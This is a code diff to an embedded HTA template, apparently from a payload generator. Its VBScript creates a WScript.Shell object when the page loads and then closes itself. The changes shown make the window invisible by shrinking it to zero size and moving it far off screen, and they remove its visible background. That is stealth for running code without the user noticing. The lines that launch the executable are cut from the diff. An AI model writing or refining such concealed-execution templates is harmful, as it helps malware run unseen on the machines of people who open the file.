@@ -52,13 +52,15 @@ _HTA_EXE_TEMPLATE = '''\
     MINIMIZEBUTTON="no"
     INNERBORDER="no"
     SELECTION="no"
+    WIDTH="1"
+    HEIGHT="1"
 />
 <title></title>
 </head>
 <script language="VBScript">
 Sub Window_OnLoad
-    window.moveTo -200, -200
-    window.resizeTo 1, 1
+    window.moveTo -32000, -32000
+    window.resizeTo 0, 0
     Dim sh, tmp, n
     Set sh = CreateObject("WScript.Shell")
     Randomize
@@ -69,7 +71,7 @@ Sub Window_OnLoad
     Self.Close
 End Sub
 </script>
-<body style="margin:0;padding:0;background:#000;"></body>
+<body style="margin:0;padding:0;overflow:hidden;"></body>
 </html>
 '''
 
